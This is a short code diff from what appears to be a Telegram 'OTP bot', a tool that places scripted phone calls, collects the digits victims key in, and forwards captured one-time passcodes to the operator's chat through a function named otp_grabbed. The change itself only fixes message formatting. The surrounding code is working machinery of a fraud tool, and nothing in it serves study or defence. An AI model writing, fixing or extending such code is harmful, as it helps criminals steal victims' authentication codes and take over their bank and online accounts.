@@ -968,7 +968,7 @@ def custom_prebuild_script_call(script_id,chatid):
     elif event == "dtmf.entered":
         data = request.get_json()
         digit =  data['digit']
-        bot.send_message(chatid,f"📳 Digit Pressed : {digit}*",parse_mode='markdown')
+        bot.send_message(chatid,f"*📳 Digit Pressed : {digit}*",parse_mode='markdown')
         
     elif event == "dtmf.gathered":
         data = request.get_json()
@@ -999,7 +999,7 @@ def custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp=otp2)
-            bot.send_message(chatid,f"""*OTP Received:<code> {otp2}</code> ✅*""",parse_mode='HTML')
+            bot.send_message(chatid,f"""<b>OTP Received:<code> {otp2}</code> ✅</b>""",parse_mode='HTML')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
